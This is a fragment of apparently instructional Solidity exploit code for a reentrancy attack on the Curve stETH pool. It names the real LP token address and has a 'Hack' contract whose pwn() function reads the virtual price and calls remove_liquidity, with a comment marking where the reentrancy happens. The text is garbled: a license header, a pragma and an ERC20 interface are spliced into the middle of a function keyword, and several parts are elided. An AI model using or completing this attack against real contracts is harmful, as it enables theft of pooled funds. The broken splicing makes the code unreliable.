...
address constant LP = 0x06325440D014e39736583c165C2963BA99fAf14E; //the token when you get when you deposit token in steth pool

interface ICurve {
  function get_virtual_price() external view returns (uint); // you'll get the value of shares, the higher the value of shares the more tokens you will get that is locked inside the pool when you call the withdraw function 

  function add_liquidity(uint[2] calldata amounts, uint min_mint_amount) // we can add tokens to this pool by calling add liquidity
    external
    payable
    returns (uint);
...
contract Hack {
    ...
    func// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
...
interface IERC20 {
  ...
  event Approval(address indexed owner, address indexed spender, uint value);
}tion pwn() external payable { 
        //This is going to be the main function while intitating our attack
        ...
        //Log get_virtual-price
        console.log("before remove LP - virtual price", pool.get_virtual_price());
        uint[2] memory min_amounts = [uint(0), uint(0)];
        pool.remove_liquidity(lp, min_amounts);


        //remove liquidity - THIS IS WHERE WE ARE DOING REENTRANCY and by calling this func it will send us back some eth
